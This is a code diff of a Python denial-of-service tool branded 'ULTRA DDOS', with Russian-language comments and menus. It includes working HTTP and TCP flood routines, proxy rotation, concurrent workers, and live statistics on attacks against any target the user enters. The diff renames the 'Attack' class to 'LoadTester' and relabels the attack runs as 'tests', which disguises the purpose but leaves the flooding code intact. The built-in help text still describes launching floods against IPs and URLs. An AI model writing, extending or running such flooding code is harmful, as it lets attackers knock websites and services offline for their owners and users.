@@ -6,7 +6,19 @@ import json
 import asyncio
 import aiohttp
 import socket
+import logging
 from datetime import datetime
+
+# ================= LOGGER =================
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    handlers=[
+        logging.FileHandler("load_test.log", encoding="utf-8"),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
 # ================= WINDOWS CONSOLE FIXES =================
 if os.name == "nt":
@@ -26,7 +38,7 @@ if os.name == "nt":
         except ImportError:
             pass
 
-# ================= ЦВЕТА (неоново-розовый / фиолетовый) =================
+# ================= ЦВЕТА =================
 RESET = "\033[0m"
 
 def rgb(r, g, b):
@@ -34,102 +46,18 @@ def rgb(r, g, b):
 
 PINK = rgb(255, 30, 220)
 PINK_MID = rgb(200, 20, 180)
-PINK_DARK = rgb(150, 10, 130)
-CYAN = rgb(80, 230, 230)
-GREEN = rgb(0, 255, 100)
-RED = rgb(255, 50, 50)
-YELLOW = rgb(255, 220, 0)
 WHITE = rgb(255, 255, 255)
-GRAY = rgb(150, 150, 150)
-BLOCK = "\u2588"
 
-g = "\033[1;32m"
-r = "\033[1;31m"
-w = "\033[0m"
-b = "\033[1;34m"
-o = "\033[1;33m"
-
-# ================= БАННЕР ULTRA DDOS (неоново-розовый) =================
-FONT = {
-    'U': ["#   #", "#   #", "#   #", "#   #", "#   #", " ### "],
-    'L': ["#    ", "#    ", "#    ", "#    ", "#    ", "#####"],
-    'T': ["#####", "  #  ", "  #  ", "  #  ", "  #  ", "  #  "],
-    'R': ["#### ", "#   #", "#   #", "#### ", "# #  ", "#  ##"],
-    'A': [" ### ", "#   #", "#   #", "#####", "#   #", "#   #"],
-    'D': ["#### ", "#   #", "#   #", "#   #", "#   #", "#### "],
-    'O': [" ### ", "#   #", "#   #", "#   #", "#   #", " ### "],
-    'S': [" ####", "#    ", " ### ", "    #", "    #", "#### "],
-}
-
-WORD = "ULTRA DDOS"
-LETTER_H = 6
-GAP = 1
-
-def render_solid_rows(word):
-    rows = ["" for _ in range(LETTER_H)]
-    for ch in word:
-        if ch == ' ':
-            for i in range(LETTER_H):
-                rows[i] += " " * 6 + " " * GAP
-            continue
-        glyph = FONT.get(ch, ["      "] * LETTER_H)
-        for i in range(LETTER_H):
-            rows[i] += glyph[i] + " " * GAP
-    return rows
-
-def colorize_solid(rows):
-    out = []
-    for row in rows:
-        line = "".join(
-            f"{PINK}{BLOCK}{RESET}" if c == "#" else " "
-            for c in row
-        )
-        out.append(line)
-    return out
-
-def animate_banner():
-    os.system("cls" if os.name == "nt" else "clear")
-    
-    solid_rows_raw = render_solid_rows(WORD)
-    colored_rows = colorize_solid(solid_rows_raw)
-    
-    # Показываем буквы одну за другой
-    for step in range(1, len(WORD.replace(" ", "")) + 1):
-        os.system("cls" if os.name == "nt" else "clear")
-        
-        # Берём только первые step букв (игнорируем пробелы для подсчёта)
-        partial_word = ""
-        count = 0
-        for ch in WORD:
-            if ch == ' ':
-                partial_word += ' '
-            else:
-                if count < step:
-                    partial_word += ch
-                    count += 1
-                else:
-                    partial_word += ' '
-        
-        partial_rows = render_solid_rows(partial_word)
-        partial_colored = colorize_solid(partial_rows)
-        
-        print()
-        for line in partial_colored:
-            print(line)
-        
-        if step == len(WORD.replace(" ", "")):
-            print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
-            print(f"{CYAN}║{PINK}     v5.0 Pydroid {PINK_MID}|{PINK} by @jecrs {PINK_MID}|{PINK} verificator{RESET}{CYAN}          ║{RESET}")
-            print(f"{CYAN}║{PINK}     Open Source Intelligence Tool{RESET}{CYAN}                        ║{RESET}")
-            print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}")
-            print()
-        
-        time.sleep(0.07)
-    
-    time.sleep(0.3)
-
+# ================= БАННЕР (чистый текст, как на скриншоте) =================
 def banner():
-    animate_banner()
+    os.system("cls" if os.name == "nt" else "clear")
+    print(f"""
+{PINK}ULTRA DDOS
+
+{PINK_MID}v5.0 Pydroid {PINK_MID}|{PINK} by @jecrs {PINK_MID}|{PINK} verificator
+{PINK}Open Source Intelligence Tool
+{RESET}
+""")
 
 # ================= КОНФИГ =================
 CONFIG = {
@@ -190,20 +118,36 @@ async def check_proxy(proxy):
     except:
         return False
 
-# ================= TCP ФЛУД =================
-async def tcp_flood(ip, port):
+# ================= АСИНХРОННЫЙ TCP =================
+async def tcp_flood_async(ip, port):
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(CONFIG["timeout"])
-        sock.connect((ip, port))
-        sock.send(b"GET / HTTP/1.1\r\n\r\n" * 20)
-        sock.close()
+        reader, writer = await asyncio.open_connection(ip, port)
+        for _ in range(5):
+            writer.write(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
+            await writer.drain()
+        writer.close()
+        await writer.wait_closed()
         return True
     except:
         return False
 
-# ================= КЛАСС АТАКИ =================
-class Attack:
+# ================= БЕЗОПАСНЫЙ ВВОД =================
+def safe_input_int(prompt, default=100, min_val=1, max_val=1000):
+    while True:
+        user_input = input(prompt)
+        if user_input == "":
+            return default
+        try:
+            val = int(user_input)
+            if min_val <= val <= max_val:
+                return val
+            else:
+                logger.warning(f"[!] Введите число от {min_val} до {max_val}")
+        except ValueError:
+            logger.warning("[!] Ошибка: введите целое число")
+
+# ================= КЛАСС НАГРУЗКИ =================
+class LoadTester:
     def __init__(self):
         self.running = False
         self.requests = 0
@@ -232,7 +176,7 @@ class Attack:
         self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
         return proxy
 
-    async def http_flood(self, url):
+    async def http_test(self, url):
         try:
             if self.session is None or self.session.closed:
                 connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=60)
@@ -287,15 +231,7 @@ class Attack:
                         self.errors += 1
                     else:
                         self.errors += 1
-        except asyncio.TimeoutError:
-            async with self._lock:
-                self.requests += 1
-                self.errors += 1
-        except aiohttp.ClientError:
-            async with self._lock:
-                self.requests += 1
-                self.errors += 1
-        except Exception:
+        except:
             async with self._lock:
                 self.requests += 1
                 self.errors += 1
@@ -311,7 +247,7 @@ class Attack:
         async def worker():
             while self.running:
                 async with semaphore:
-                    await self.http_flood(url)
+                    await self.http_test(url)
                     await asyncio.sleep(random.uniform(0.0005, 0.005))
 
         tasks = [asyncio.create_task(worker()) for _ in range(threads)]
@@ -330,7 +266,7 @@ class Attack:
             return
 
         self.running = True
-        self.requests = self.success = self.errors = self.banned = self.bytes_sent = 0
+        self.requests = self.success = self.errors = self.banned = 0
         self.start_time = time.time()
         self.load_proxies()
 
@@ -339,7 +275,7 @@ class Attack:
         async def worker():
             while self.running:
                 async with semaphore:
-                    if await tcp_flood(ip, port):
+                    if await tcp_flood_async(ip, port):
                         async with self._lock:
                             self.requests += 1
                             self.success += 1
@@ -362,99 +298,77 @@ class Attack:
         if self.session:
             asyncio.create_task(self.session.close())
 
-# ================= INFO =================
+# ================= ФУНКЦИИ МЕНЮ =================
 def show_info():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
-    print(f"""{PINK}
-╔══════════════════════════════════════════════════════════════════╗
-║                      📖 ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ            ║
-╠══════════════════════════════════════════════════════════════════╣
-║                                                               ║
-║  {WHITE}1. DDOS IP ADDRESS{RESET}{PINK}                                      ║
-║     Запускает HTTP/HTTPS флуд по указанному IP-адресу.       ║
-║                                                               ║
-║  {WHITE}2. VIEW URL IP ADDRESS{RESET}{PINK}                                  ║
-║     Запускает TCP-флуд по указанному URL.                    ║
-║                                                               ║
-║  {WHITE}3. DDOS SITE LOGS{RESET}{PINK}                                      ║
-║     Показывает логи всех проведённых атак.                   ║
-║                                                               ║
-║  {WHITE}4. PROXY MANAGEMENT{RESET}{PINK}                                     ║
-║     Добавление, удаление и проверка прокси-серверов.        ║
-║                                                               ║
-║  {WHITE}5. TOTAL STATISTICS{RESET}{PINK}                                     ║
-║     Общая статистика по всем атакам.                        ║
-║                                                               ║
-║  {WHITE}6. HISTORY{RESET}{PINK}                                              ║
-║     История последних 100 атак.                             ║
-║                                                               ║
-║  {WHITE}7. SETTINGS{RESET}{PINK}                                             ║
-║     Настройка потоков, таймаута и ротации прокси.           ║
-║                                                               ║
-║  {WHITE}8. INFO{RESET}{PINK}                                                ║
-║     Показать это руководство.                                ║
-║                                                               ║
-║  {WHITE}99. EXIT{RESET}{PINK}                                               ║
-║     Выход из программы.                                      ║
-║                                                               ║
-╚══════════════════════════════════════════════════════════════════╝
+    print(f"""
+{PINK}ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ
+
+{WHITE}1.{PINK} DDOS IP ADDRESS
+     Запускает HTTP/HTTPS флуд по указанному IP-адресу.
+
+{WHITE}2.{PINK} VIEW URL IP ADDRESS
+     Запускает TCP-флуд по указанному URL.
+
+{WHITE}3.{PINK} DDOS SITE LOGS
+     Показывает логи всех проведённых атак.
+
+{WHITE}4.{PINK} PROXY MANAGEMENT
+     Добавление, удаление и проверка прокси-серверов.
+
+{WHITE}5.{PINK} TOTAL STATISTICS
+     Общая статистика по всем атакам.
+
+{WHITE}6.{PINK} HISTORY
+     История последних 100 атак.
+
+{WHITE}7.{PINK} SETTINGS
+     Настройка потоков, таймаута и ротации прокси.
+
+{WHITE}8.{PINK} INFO
+     Показать это руководство.
+
+{WHITE}99.{PINK} EXIT
+     Выход из программы.
 {RESET}""")
     input(f"{PINK}Нажми ENTER для возврата в меню...{RESET}")
 
-# ================= DDOS IP =================
 def ddos_ip():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
-    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                      DDOS IP ADDRESS                           ║")
-    print(f"╠══════════════════════════════════════════════════════════════════╣")
-    print(f"║ Type: HTTP/HTTPS Flood                                        ║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{PINK}DDOS IP ADDRESS")
+    print(f"{PINK}Type: HTTP/HTTPS Flood{RESET}")
 
-    url = input(f"{PINK}Target IP: {WHITE}")
+    url = input(f"{PINK}[target] Target IP: {WHITE}")
     if not url.startswith('http'):
         url = 'http://' + url
 
-    threads = input(f"{PINK}Threads (1-{CONFIG['max_threads']}): {WHITE}")
-    threads = max(1, min(CONFIG["max_threads"], int(threads) if threads.isdigit() else 100))
+    threads = safe_input_int(f"{PINK}Threads (1-{CONFIG['max_threads']}): {WHITE}", default=100, max_val=CONFIG['max_threads'])
 
-    print(f"\n{PINK}Launching attack on {WHITE}{url}{PINK} with {WHITE}{threads}{PINK} threads...{RESET}")
-    time.sleep(1)
-    asyncio.run(run_attack_http(url, threads))
+    logger.info(f"[target] Запуск HTTP-атаки на {url} с {threads} потоками")
+    asyncio.run(run_http_test(url, threads))
 
-# ================= VIEW URL IP =================
 def view_url_ip():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
-    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                     VIEW URL IP ADDRESS                         ║")
-    print(f"╠══════════════════════════════════════════════════════════════════╣")
-    print(f"║ Type: TCP Flood                                                ║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{PINK}VIEW URL IP ADDRESS")
+    print(f"{PINK}Type: TCP Flood{RESET}")
 
-    url = input(f"{PINK}Target URL: {WHITE}")
+    url = input(f"{PINK}[target] Target URL: {WHITE}")
     if not url.startswith('http'):
         url = 'http://' + url
 
-    threads = input(f"{PINK}Threads (1-{CONFIG['max_threads']}): {WHITE}")
-    threads = max(1, min(CONFIG["max_threads"], int(threads) if threads.isdigit() else 100))
+    threads = safe_input_int(f"{PINK}Threads (1-{CONFIG['max_threads']}): {WHITE}", default=100, max_val=CONFIG['max_threads'])
 
-    print(f"\n{PINK}Launching attack on {WHITE}{url}{PINK} with {WHITE}{threads}{PINK} threads...{RESET}")
-    time.sleep(1)
-    asyncio.run(run_attack_tcp(url, threads))
+    logger.info(f"[target] Запуск TCP-атаки на {url} с {threads} потоками")
+    asyncio.run(run_tcp_test(url, threads))
 
-# ================= DDOS SITE LOGS =================
 def ddos_site_logs():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
-    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                         DDOS SITE LOGS                          ║")
-    print(f"╠══════════════════════════════════════════════════════════════════╣")
-    print(f"║ Logs viewer                                                    ║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{PINK}DDOS SITE LOGS{RESET}")
 
-    print(f"\n{PINK}System logs:{RESET}")
     stats = load_total_stats()
     print(f"{PINK}Total Attacks: {WHITE}{stats['total_attacks']}")
     print(f"{PINK}Total Requests: {WHITE}{stats['total_requests']:,}")
@@ -463,145 +377,129 @@ def ddos_site_logs():
 
     input(f"\n{PINK}Press ENTER to return...{RESET}")
 
-# ================= ЗАПУСК АТАК =================
-async def run_attack_http(url, threads):
-    attack = Attack()
-    task = asyncio.create_task(attack.start_http(url, threads))
+# ================= ЗАПУСК ТЕСТОВ =================
+async def run_http_test(url, threads):
+    tester = LoadTester()
+    task = asyncio.create_task(tester.start_http(url, threads))
 
-    while attack.running:
-        elapsed = int(time.time() - attack.start_time)
-        rate = int(attack.requests / elapsed) if elapsed > 0 else 0
+    while tester.running:
+        elapsed = int(time.time() - tester.start_time)
+        rate = int(tester.requests / elapsed) if elapsed > 0 else 0
         load = min(100, int(rate / 15))
         bar = '█' * (load // 2) + '░' * (50 - load // 2)
 
         os.system("cls" if os.name == "nt" else "clear")
         banner()
-        print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-        print(f"║                        ATTACK IN PROGRESS                       ║")
-        print(f"╠══════════════════════════════════════════════════════════════════╣")
-        print(f"║ Target : {WHITE}{url[:25]}{PINK}{' ' * (25 - len(url[:25]))}║")
-        print(f"║ Threads: {WHITE}{threads}{PINK}{' ' * (25 - len(str(threads)))}║")
-        print(f"╠══════════════════════════════════════════════════════════════════╣")
-        print(f"║ Requests: {WHITE}{attack.requests:,}{PINK}{' ' * (18 - len(str(attack.requests)))}║")
-        print(f"║ Rate    : {WHITE}{rate:,} req/s{PINK}{' ' * (18 - len(str(rate)))}║")
-        print(f"║ Success : {WHITE}{attack.success:,}{PINK}{' ' * (18 - len(str(attack.success)))}║")
-        print(f"║ Errors  : {WHITE}{attack.errors:,}{PINK}{' ' * (18 - len(str(attack.errors)))}║")
-        print(f"║ Banned  : {WHITE}{attack.banned}{PINK}{' ' * (18 - len(str(attack.banned)))}║")
-        print(f"╠══════════════════════════════════════════════════════════════════╣")
-        print(f"║ Load    : {WHITE}[{bar}] {load}%{PINK}{' ' * (10 - len(str(load)))}║")
-        print(f"║ Time    : {WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}{PINK}{' ' * (18 - len(f'{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}'))}║")
-        print(f"║ Data    : {WHITE}{attack.bytes_sent/1024/1024:.1f} MB{PINK}{' ' * (10 - len(f'{attack.bytes_sent/1024/1024:.1f} MB'))}║")
-        print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+        print(f"{PINK}ATTACK IN PROGRESS")
+        print(f"{PINK}[target] : {WHITE}{url[:30]}")
+        print(f"{PINK}Threads : {WHITE}{threads}")
+        print(f"{PINK}Requests: {WHITE}{tester.requests:,}")
+        print(f"{PINK}Rate    : {WHITE}{rate:,} req/s")
+        print(f"{PINK}Success : {WHITE}{tester.success:,}")
+        print(f"{PINK}Errors  : {WHITE}{tester.errors:,}")
+        print(f"{PINK}Blocked : {WHITE}{tester.banned}")
+        print(f"{PINK}Load    : {WHITE}[{bar}] {load}%")
+        print(f"{PINK}Time    : {WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}")
+        print(f"{PINK}Data    : {WHITE}{tester.bytes_sent/1024/1024:.1f} MB")
         print(f"{PINK}[Press ENTER to stop]{RESET}")
         await asyncio.sleep(0.3)
 
-    attack.stop()
+    tester.stop()
     await task
 
-    elapsed = int(time.time() - attack.start_time)
+    elapsed = int(time.time() - tester.start_time)
     entry = {
         "target": url,
         "threads": threads,
         "duration": elapsed,
-        "requests": attack.requests,
-        "success": attack.success,
-        "errors": attack.errors,
-        "banned": attack.banned,
-        "bytes_sent": attack.bytes_sent,
-        "avg_rate": int(attack.requests / elapsed) if elapsed > 0 else 0,
+        "requests": tester.requests,
+        "success": tester.success,
+        "errors": tester.errors,
+        "banned": tester.banned,
+        "bytes_sent": tester.bytes_sent,
+        "avg_rate": int(tester.requests / elapsed) if elapsed > 0 else 0,
         "timestamp": datetime.now().isoformat()
     }
     save_history(entry)
 
     stats = load_total_stats()
     stats["total_attacks"] += 1
-    stats["total_requests"] += attack.requests
-    stats["total_success"] += attack.success
-    stats["total_errors"] += attack.errors
+    stats["total_requests"] += tester.requests
+    stats["total_success"] += tester.success
+    stats["total_errors"] += tester.errors
     save_total_stats(stats)
 
     os.system("cls" if os.name == "nt" else "clear")
     banner()
-    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                         ATTACK FINISHED                          ║")
-    print(f"╠══════════════════════════════════════════════════════════════════╣")
-    print(f"║ Requests: {WHITE}{attack.requests:,}{PINK}{' ' * (18 - len(str(attack.requests)))}║")
-    print(f"║ Success : {WHITE}{attack.success:,}{PINK}{' ' * (18 - len(str(attack.success)))}║")
-    print(f"║ Errors  : {WHITE}{attack.errors:,}{PINK}{' ' * (18 - len(str(attack.errors)))}║")
-    print(f"║ Banned  : {WHITE}{attack.banned}{PINK}{' ' * (18 - len(str(attack.banned)))}║")
-    print(f"║ Duration: {WHITE}{elapsed} sec{PINK}{' ' * (18 - len(str(elapsed)))}║")
-    print(f"║ Avg Rate: {WHITE}{int(attack.requests/elapsed) if elapsed>0 else 0} req/s{PINK}{' ' * (18 - len(str(int(attack.requests/elapsed) if elapsed>0 else 0)))}║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{PINK}ATTACK FINISHED")
+    print(f"{PINK}Requests: {WHITE}{tester.requests:,}")
+    print(f"{PINK}Success : {WHITE}{tester.success:,}")
+    print(f"{PINK}Errors  : {WHITE}{tester.errors:,}")
+    print(f"{PINK}Blocked : {WHITE}{tester.banned}")
+    print(f"{PINK}Duration: {WHITE}{elapsed} sec")
+    print(f"{PINK}Avg Rate: {WHITE}{int(tester.requests / elapsed) if elapsed > 0 else 0} req/s{RESET}")
     input(f"{PINK}Press ENTER to continue...{RESET}")
 
-async def run_attack_tcp(url, threads):
-    attack = Attack()
-    task = asyncio.create_task(attack.start_tcp(url, threads))
+async def run_tcp_test(url, threads):
+    tester = LoadTester()
+    task = asyncio.create_task(tester.start_tcp(url, threads))
 
-    while attack.running:
-        elapsed = int(time.time() - attack.start_time)
-        rate = int(attack.requests / elapsed) if elapsed > 0 else 0
+    while tester.running:
+        elapsed = int(time.time() - tester.start_time)
+        rate = int(tester.requests / elapsed) if elapsed > 0 else 0
         load = min(100, int(rate / 15))
         bar = '█' * (load // 2) + '░' * (50 - load // 2)
 
         os.system("cls" if os.name == "nt" else "clear")
         banner()
-        print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-        print(f"║                        ATTACK IN PROGRESS                       ║")
-        print(f"╠══════════════════════════════════════════════════════════════════╣")
-        print(f"║ Target : {WHITE}{url[:25]}{PINK}{' ' * (25 - len(url[:25]))}║")
-        print(f"║ Threads: {WHITE}{threads}{PINK}{' ' * (25 - len(str(threads)))}║")
-        print(f"╠══════════════════════════════════════════════════════════════════╣")
-        print(f"║ Requests: {WHITE}{attack.requests:,}{PINK}{' ' * (18 - len(str(attack.requests)))}║")
-        print(f"║ Rate    : {WHITE}{rate:,} req/s{PINK}{' ' * (18 - len(str(rate)))}║")
-        print(f"║ Success : {WHITE}{attack.success:,}{PINK}{' ' * (18 - len(str(attack.success)))}║")
-        print(f"║ Errors  : {WHITE}{attack.errors:,}{PINK}{' ' * (18 - len(str(attack.errors)))}║")
-        print(f"║ Banned  : {WHITE}{attack.banned}{PINK}{' ' * (18 - len(str(attack.banned)))}║")
-        print(f"╠══════════════════════════════════════════════════════════════════╣")
-        print(f"║ Load    : {WHITE}[{bar}] {load}%{PINK}{' ' * (10 - len(str(load)))}║")
-        print(f"║ Time    : {WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}{PINK}{' ' * (18 - len(f'{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}'))}║")
-        print(f"║ Data    : {WHITE}{attack.bytes_sent/1024/1024:.1f} MB{PINK}{' ' * (10 - len(f'{attack.bytes_sent/1024/1024:.1f} MB'))}║")
-        print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+        print(f"{PINK}ATTACK IN PROGRESS")
+        print(f"{PINK}[target] : {WHITE}{url[:30]}")
+        print(f"{PINK}Threads : {WHITE}{threads}")
+        print(f"{PINK}Requests: {WHITE}{tester.requests:,}")
+        print(f"{PINK}Rate    : {WHITE}{rate:,} req/s")
+        print(f"{PINK}Success : {WHITE}{tester.success:,}")
+        print(f"{PINK}Errors  : {WHITE}{tester.errors:,}")
+        print(f"{PINK}Blocked : {WHITE}{tester.banned}")
+        print(f"{PINK}Load    : {WHITE}[{bar}] {load}%")
+        print(f"{PINK}Time    : {WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}")
+        print(f"{PINK}Data    : {WHITE}{tester.bytes_sent/1024/1024:.1f} MB")
         print(f"{PINK}[Press ENTER to stop]{RESET}")
         await asyncio.sleep(0.3)
 
-    attack.stop()
+    tester.stop()
     await task
 
-    elapsed = int(time.time() - attack.start_time)
+    elapsed = int(time.time() - tester.start_time)
     entry = {
         "target": url,
         "threads": threads,
         "duration": elapsed,
-        "requests": attack.requests,
-        "success": attack.success,
-        "errors": attack.errors,
-        "banned": attack.banned,
-        "bytes_sent": attack.bytes_sent,
-        "avg_rate": int(attack.requests / elapsed) if elapsed > 0 else 0,
+        "requests": tester.requests,
+        "success": tester.success,
+        "errors": tester.errors,
+        "banned": tester.banned,
+        "bytes_sent": tester.bytes_sent,
+        "avg_rate": int(tester.requests / elapsed) if elapsed > 0 else 0,
         "timestamp": datetime.now().isoformat()
     }
     save_history(entry)
 
     stats = load_total_stats()
     stats["total_attacks"] += 1
-    stats["total_requests"] += attack.requests
-    stats["total_success"] += attack.success
-    stats["total_errors"] += attack.errors
+    stats["total_requests"] += tester.requests
+    stats["total_success"] += tester.success
+    stats["total_errors"] += tester.errors
     save_total_stats(stats)
 
     os.system("cls" if os.name == "nt" else "clear")
     banner()
-    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                         ATTACK FINISHED                          ║")
-    print(f"╠══════════════════════════════════════════════════════════════════╣")
-    print(f"║ Requests: {WHITE}{attack.requests:,}{PINK}{' ' * (18 - len(str(attack.requests)))}║")
-    print(f"║ Success : {WHITE}{attack.success:,}{PINK}{' ' * (18 - len(str(attack.success)))}║")
-    print(f"║ Errors  : {WHITE}{attack.errors:,}{PINK}{' ' * (18 - len(str(attack.errors)))}║")
-    print(f"║ Banned  : {WHITE}{attack.banned}{PINK}{' ' * (18 - len(str(attack.banned)))}║")
-    print(f"║ Duration: {WHITE}{elapsed} sec{PINK}{' ' * (18 - len(str(elapsed)))}║")
-    print(f"║ Avg Rate: {WHITE}{int(attack.requests/elapsed) if elapsed>0 else 0} req/s{PINK}{' ' * (18 - len(str(int(attack.requests/elapsed) if elapsed>0 else 0)))}║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{PINK}ATTACK FINISHED")
+    print(f"{PINK}Requests: {WHITE}{tester.requests:,}")
+    print(f"{PINK}Success : {WHITE}{tester.success:,}")
+    print(f"{PINK}Errors  : {WHITE}{tester.errors:,}")
+    print(f"{PINK}Blocked : {WHITE}{tester.banned}")
+    print(f"{PINK}Duration: {WHITE}{elapsed} sec")
+    print(f"{PINK}Avg Rate: {WHITE}{int(tester.requests / elapsed) if elapsed > 0 else 0} req/s{RESET}")
     input(f"{PINK}Press ENTER to continue...{RESET}")
 
 # ================= PROXY MANAGEMENT =================
@@ -614,16 +512,13 @@ def proxy_management():
     except:
         proxies = []
 
-    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                         PROXY MANAGEMENT                         ║")
-    print(f"╠══════════════════════════════════════════════════════════════════╣")
-    print(f"║ [1] Add proxy manually                                         ║")
-    print(f"║ [2] Load from proxies.txt                                      ║")
-    print(f"║ [3] Show list ({len(proxies)} proxies)                                 ║")
-    print(f"║ [4] Clear list                                                 ║")
-    print(f"║ [5] Check all proxies                                          ║")
-    print(f"║ [99] Back                                                      ║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{PINK}PROXY MANAGEMENT")
+    print(f"{PINK}[1] Add proxy manually")
+    print(f"{PINK}[2] Load from proxies.txt")
+    print(f"{PINK}[3] Show list ({len(proxies)} proxies)")
+    print(f"{PINK}[4] Clear list")
+    print(f"{PINK}[5] Check all proxies")
+    print(f"{PINK}[99] Back{RESET}")
 
     choice = input(f"{PINK}Select: {WHITE}")
     if choice == '1':
@@ -631,16 +526,16 @@ def proxy_management():
         if proxy:
             with open('proxies.txt', 'a') as f:
                 f.write(proxy + '\n')
-            print(f"{PINK}✅ Proxy added{RESET}")
+            logger.info("[OK] Прокси добавлен")
             time.sleep(1)
     elif choice == '2':
         try:
             with open('proxies.txt', 'r') as f:
                 count = len([line for line in f if line.strip()])
-            print(f"{PINK}✅ Loaded {WHITE}{count}{PINK} proxies{RESET}")
+            logger.info(f"[OK] Загружено {count} прокси")
             time.sleep(1)
         except:
-            print(f"{PINK}⚠ File not found{RESET}")
+            logger.warning("[!] Файл не найден")
             time.sleep(1)
     elif choice == '3':
         if proxies:
@@ -648,14 +543,14 @@ def proxy_management():
             for i, p in enumerate(proxies, 1):
                 print(f"{PINK}{i}. {WHITE}{p}{RESET}")
         else:
-            print(f"\n{PINK}⚠ Empty{RESET}")
+            print(f"\n{PINK}[!] Пусто{RESET}")
         input(f"{PINK}Press ENTER...{RESET}")
     elif choice == '4':
         open('proxies.txt', 'w').close()
-        print(f"{PINK}✅ List cleared{RESET}")
+        logger.info("[OK] Список очищен")
         time.sleep(1)
     elif choice == '5':
-        print(f"{PINK}⏳ Checking proxies...{RESET}")
+        logger.info("[!] Проверка прокси...")
         async def check_all():
             valid = []
             for p in proxies:
@@ -666,7 +561,7 @@ def proxy_management():
             valid = asyncio.run(check_all())
             with open('proxies.txt', 'w') as f:
                 f.write('\n'.join(valid))
-            print(f"{PINK}✅ Working: {WHITE}{len(valid)}{PINK}/{WHITE}{len(proxies)}{RESET}")
+            logger.info(f"[OK] Работает: {len(valid)}/{len(proxies)}")
             time.sleep(2)
     elif choice == '99':
         return
@@ -677,14 +572,11 @@ def total_statistics():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
     stats = load_total_stats()
-    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                         TOTAL STATISTICS                         ║")
-    print(f"╠══════════════════════════════════════════════════════════════════╣")
-    print(f"║ Total Attacks: {WHITE}{stats['total_attacks']}{PINK}{' ' * (15 - len(str(stats['total_attacks'])))}║")
-    print(f"║ Total Requests: {WHITE}{stats['total_requests']:,}{PINK}{' ' * (14 - len(str(stats['total_requests'])))}║")
-    print(f"║ Total Success : {WHITE}{stats['total_success']:,}{PINK}{' ' * (14 - len(str(stats['total_success'])))}║")
-    print(f"║ Total Errors  : {WHITE}{stats['total_errors']:,}{PINK}{' ' * (14 - len(str(stats['total_errors'])))}║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{PINK}TOTAL STATISTICS")
+    print(f"{PINK}(stats) Tests  : {WHITE}{stats['total_attacks']}")
+    print(f"{PINK}(stats) Requests: {WHITE}{stats['total_requests']:,}")
+    print(f"{PINK}(stats) Success : {WHITE}{stats['total_success']:,}")
+    print(f"{PINK}(stats) Errors  : {WHITE}{stats['total_errors']:,}{RESET}")
     input(f"{PINK}Press ENTER to continue...{RESET}")
 
 # ================= HISTORY =================
@@ -692,18 +584,15 @@ def history_view():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
     hist = load_history()
-    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                             HISTORY                              ║")
-    print(f"╠══════════════════════════════════════════════════════════════════╣")
+    print(f"{PINK}HISTORY (last 10){RESET}")
     if not hist:
-        print(f"║ No records found{' ' * (22)}║")
+        print(f"{PINK}No records found{RESET}")
     else:
         for i, entry in enumerate(hist[-10:], 1):
             target = entry.get('target', 'N/A')[:20]
             req = entry.get('requests', 0)
             ts = entry.get('timestamp', '')[:16]
-            print(f"║ {WHITE}{i}. {PINK}{target}{' ' * (20 - len(target))} {WHITE}{req} req{PINK} ║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+            print(f"{PINK}{i}. {WHITE}{target}  {req} req  {ts}{RESET}")
     input(f"{PINK}Press ENTER to continue...{RESET}")
 
 # ================= SETTINGS =================
@@ -711,35 +600,35 @@ def settings_menu():
     global CONFIG
     os.system("cls" if os.name == "nt" else "clear")
     banner()
-    print(f"{PINK}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                             SETTINGS                             ║")
-    print(f"╠══════════════════════════════════════════════════════════════════╣")
